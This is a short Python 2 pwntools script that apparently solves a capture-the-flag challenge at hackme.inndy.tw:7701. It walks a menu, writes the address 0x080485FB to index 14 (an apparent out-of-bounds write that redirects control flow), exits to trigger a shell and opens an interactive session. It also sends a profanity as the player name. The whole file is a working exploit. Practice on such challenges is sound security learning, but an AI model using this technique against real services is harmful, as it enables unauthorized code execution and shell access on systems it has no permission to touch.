#!/usr/bin/env python2
from pwn import *

conn = connect('hackme.inndy.tw', 7701)

def Sendline(m):
    sleep(1)
    conn.sendline(m)
    print(m)

# what is your name
print conn.read(),
Sendline('fuck')

# menu
# select 1
print conn.read(),
Sendline('1')

# input index
print conn.read(),
Sendline('14')

# input number
print conn.read(),
Sendline('%d' % 0x080485FB)

# select 0 to exit and get shell
print conn.read(),
Sendline('0')

conn.interactive()
